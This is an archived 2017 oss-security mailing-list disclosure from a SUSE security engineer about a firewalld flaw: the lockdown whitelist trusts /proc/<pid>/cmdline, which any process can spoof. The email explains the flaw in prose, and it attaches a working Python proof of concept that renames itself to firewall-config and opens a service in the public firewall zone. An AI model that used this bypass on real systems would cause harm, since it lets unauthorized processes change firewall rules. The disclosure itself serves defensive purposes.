X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7300" "Thursday" "13" "July" "2017" "18:34:42" "+0200" "Matthias Gerstner" "mgerstner@suse.de" "<20170713163442.GA14986@f195.suse.de>" "196" "[oss-security] firewalld: lockdown whitelist cmdline access check is not secure" nil nil nil "7" "2017071316:34:42" "[oss-security] firewalld: lockdown whitelist cmdline access check is not secure" (number mark "U       mgerstner@su Jul 13  196/7300  " thread-indent "\"[oss-security] firewalld: lockdown whitelist cmdline access check is not secure\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11396 invoked by uid 550); 13 Jul 2017 16:42:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 18364 invoked from network); 13 Jul 2017 16:34:54 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Thu, 13 Jul 2017 18:34:42 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <20170713163442.GA14986@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="gj572EiMnwbLXET9"
Content-Disposition: inline
User-Agent: Mutt/1.5.24 (2015-08-30)
Subject: [oss-security] firewalld: lockdown whitelist cmdline access check is not secure

--gj572EiMnwbLXET9
Content-Type: multipart/mixed; boundary="qDbXVdCdHGoSgWSk"
Content-Disposition: inline


--qDbXVdCdHGoSgWSk
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

This is a about a security issue I've found in firewalld. It is related
to the "lockdown" feature in firewalld. By default firewalld allows any
local applications to perform operations on the firewall. The applied
security model here is the use of polkit rules. Modifying the firewall
by default requires admin privileges (i.e. 'admin_auth_keep').

The "lockdown" feature is an additional / alternative security scheme
implemented in firewalld. It is supposed to restrict firewall
modifications via the D-Bus interface of firewalld to processes matching
a whitelist configuration. It is not active by default. The following
whitelisting categories are available (also see `man
firewalld.lockdown-whitelist` [5]):

1) processes running with a specific SELinux context
2) processes running as a specific user
3) processes running a specific command line

While 1) and 2) seem not to be problematic, variant 3) is easily
bypassed by an attacker. The command line of a requesting process is
determined in firewalld via

	dbus_utils.py:command_of_sender(),command_of_pid()

which in the end checks /proc/<pid>/cmdline of the requesting process.
The evaluation of this happens in

	server/config.py:accessCheck()

and

	server/firewalld.py:accessCheck()

The problems with checking /proc/<pid>/cmdline for this purpose are the
following:

- it is prone to race conditions. The requesting process can try to
  replace itself by some other command that didn't ever send a dbus
  request, before firewalld can make the check

- every program can change its cmdline to arbitrary values without
  special privileges using the "setproctitle" approach

Thus any program can effectively bypass the whitelist check by just
changing its cmdline to one of the whitelisted ones. Since there is an
entry in the shipped whitelist for 'firewall-config', the lockdown can
be bypassed in default installations, if a user relies on the lockdown
feature for security instead of safe polkit rules.

As I see it currently the only protection against this are strict polkit
rules that require admin authorization for all sensitive dbus methods of
firewalld. This is currently the case for the polkit rules shipped with
firewalld. However, individual distributions or users might choose to
lessen the polkit authorization checking, relying on the lockdown
feature to provide security.

Upstream told me that they know that the lockdown feature is not secure
and they wouldn't know how to fix it, except for removing the feature
completely.  It seems to me the intention of the feature is to protect
only against unwanted misconfiguration but not against malicious
programs or users.  However, the documentation in the firewalld wiki,
man pages and source code give no clear warning about the limited
security the lockdown feature can provide.

This report is a heads-up, because an unaware user or integrator might
be tempted to rely on the lockdown feature for security for some reason.

Please find attached a proof of concept python program that demonstrates
the bypass of an active lockdown. It renames itself to the whitelisted
firewall-config command and then issues a command to open 'imaps' in the
public zone.

I did not request a CVE for this as of yet. If you think it is worth one
please tell me so and I will request it.

References:

[1] https://fedoraproject.org/wiki/Features/FirewalldLockdown
[2] https://fedoraproject.org/wiki/Firewalld?rd=3DFirewallD#Lockdown
[3] https://github.com/firewalld/firewalld
[4] http://www.firewalld.org/documentation/man-pages/firewall-cmd.html
[5] http://www.firewalld.org/documentation/man-pages/firewalld.lockdown-whi=
telist.html

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Telefon: +49 911 740 53 290

SUSE Linux GmbH=20
GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nuernberg)

--qDbXVdCdHGoSgWSk
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="fwd_setproctitle_poc.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/env python

# this is a proof of concept that the firewalld lockdown implementation up
# until current version 0.4.4.5 is flawed.
#
# firewalld maintains a whitelist of commands that are allowed to bypass the
# lockdown (/etc/firewalld/lockdown-whitelist.xml).
# However, the command name is calculated from /proc/<pid>/cmdline in
# src/firewall/dbus_utils.py[command_of_pid]. This value is under attacker
# control and can easily be changed via setproctitle (which is a piece of c=
ode
# that does the low level fiddling to achieve this, also found in util-linu=
x,
# here a python module is used).

# this proof of concept changes its own cmdline to the one that is by defau=
lt
# in firewalld's whitelist to bypass the lockdown. you can run this as a
# regular user, for uid 0 the lockdown is whitelisted anyways.
#
# Run 'firewall-cmd --lockdown-on' as root prior to testing this
#
# Depending on the polkit rules setup in your system you may to run this in
# the context of a polkit agent and enter the user or administrator
# password (the latter would be mitigating this issue for your setup).

from __future__ import print_function
import os, sys

try:
	import pydbus
except ImportError:
	print("You need to install pydbus from https://github.com/LEW21/pydbus")
	print()
	print("Try 'pip install --user pydbus")
	sys.exit(1)

try:
	import setproctitle
except ImportError:
	print("You need to install setproctitle from https://pypi.python.org/pypi/=
setproctitle")
	print()
	print("Try 'pip install --user setproctitle")
	sys.exit(1)

# change this to a whitelisted command to work around an active firewalld
# lockdown
setproctitle.setproctitle("/usr/bin/python -Es /usr/bin/firewall-config")

bus =3D pydbus.SystemBus()

firewalld =3D bus.get("org.fedoraproject.FirewallD1")

try:
	# to avoid an error on double-add
	firewalld.removeService("public", "imaps")
except:
	pass

# try to open some service on the public zone
firewalld.addService("public", "imaps", 0)

--qDbXVdCdHGoSgWSk--

--gj572EiMnwbLXET9
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBAgAGBQJZZ6EiAAoJEBTEBclxkjVTtLwP/2ttJEf9HChpDmvjgKytG6sa
PjfOmBrgAF47jOsOmuJeXmcx9pOq43XdPpeCPQpKrH+RGCABf+ip9822PxVmqRMH
2lEIGI6FX9rbm5vZGsKqtjdBFgGguKX/STg56L9lb1d3ntylaKeG28IXs/qJiU4s
Gv15SHdhurCaX5s+1mF0kthlBT16Q9eVfcUSjaj3vbp8/JgqnJWL1HQMoJuDf6T+
ZQAW3bYUz3FmT9mevFnDRid+zuh9Oa3Rh3iMU4dQzmbdP3TYM5FcDolm8LlZ1L3K
IdRp4gXICeKECqpeGkGY4tVFzBQgQLEOZ4oeH0bMc1mug3ZhfLJ/d3I5Vp99gY8C
L4ZPzcCgxEAizt2mf+C341VkphqjzbiS35whyBF/xY/4hNdQp6I7IqMjAEJo9oYM
1+hvcnD1Z4JhaZcrBshpNqjOsVbZkGTe+/TSyad7xksfY8oL1B8E7Ufn6LjzGy1U
bi7yf0DvoFvPFFiVTwDkqAfJ0MfnDcCqSHOaPYHhdbL6m8F1YUJQeuhUGvwnLHQz
5cfJmzjvtY6VX3FWc4JhdjE+jXVCgJykzJmoh1OkfJ70EtQRrdbuQA7wFws1mk5k
A1Pv6GQ9Wf1UyOaAPP+KlvDjkbFQOZwCeLGErtMSKYoYn+14t22aHbM/gBRXjAAq
tsp4nLnkmp7F5A8j2asa
=jkz+
-----END PGP SIGNATURE-----

--gj572EiMnwbLXET9--
